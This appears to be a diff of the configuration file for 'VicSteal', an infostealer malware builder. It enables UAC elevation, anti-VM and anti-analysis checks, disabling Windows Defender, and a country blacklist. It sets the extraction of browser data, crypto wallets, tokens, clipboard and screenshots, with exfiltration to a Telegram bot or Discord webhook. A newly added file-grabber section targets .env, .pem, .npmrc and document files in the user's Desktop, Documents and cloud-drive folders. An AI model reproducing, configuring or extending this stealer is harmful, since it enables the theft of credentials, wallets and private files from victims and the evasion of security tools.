@@ -3,34 +3,84 @@
 
 config = {
   "logFileName": f"VicSteal-New-Log",
-  "BLACKLIST": [ # Add the country codes you want to blacklist here.
-     "ar-ma",
-     "en-ma"
-  ],
+
   "UACAdmin": 1,
+
   "antiVM": 1,
+
   "sendToTelegram": 1,
+
   "sendToDiscord": 1,
+
   "telegramBotToken": "",# write your telegram bot token here.
+  
   "telegramChatId": "",# write your telegram chat id here.
+  
   "discordWebhookUrl": "",# write your discord webhook url here.
+  
   "executionDelay": "",
+
   "antiCIS": 1,
+
+  "BLACKLIST": [ # if "antiCIS" == 1 Add the country codes you want to blacklist here.
+    "ar-ma",
+    "en-ma"
+  ],
+
   "extractBrowsersData": 1,
+
   "extractWallets": 1,
+
   "extractGameData": 1,
+
   "extractFiles": 1,
+
   "extractSystemInfo": 1,
+
   "extractBrowsersVersion": 1,
+
   "extractTokens": 1,
+
   "networkSteal": 1,
+
   "clipboardSteal": 1,
+
   "defenderDisable": 1,
+
   "checkAnalysis": 1,
+
   "extractProcess": 1,
+
   "screanShot": 1,
+
   "errorMessage": "sorry, something went wrong :(",# 
+  
   "appCollectorEnabled": 1,
+
+
+  "FileGrabber" : {
+      "FILE_EXTANTANTION" :[
+        ".pdf",
+        ".txt", 
+        ".sql", 
+        ".json", 
+        ".docx", 
+        ".pem", 
+        ".conf", 
+        ".env", 
+        ".npmrc", 
+        ".csv"
+    ],
+      "DIR_PATHS": {
+        "Desktop": "%USERPROFILE%\\Desktop",
+        "Documents": "%USERPROFILE%\\Documents",
+        "Downloads": "%USERPROFILE%\\Downloads",
+        "Pictures": "%USERPROFILE%\\Pictures",
+        "OneDrive Documents": "%USERPROFILE%\\OneDrive\\Documents",
+        "OneDrive Desktop": "%USERPROFILE%\\OneDrive\\Desktop",
+        "Google Drive": "%USERPROFILE%\\Google Drive",
+    }
+  },
   "apps": [
     {
       "name": "Cisco AnyConnect VPN",
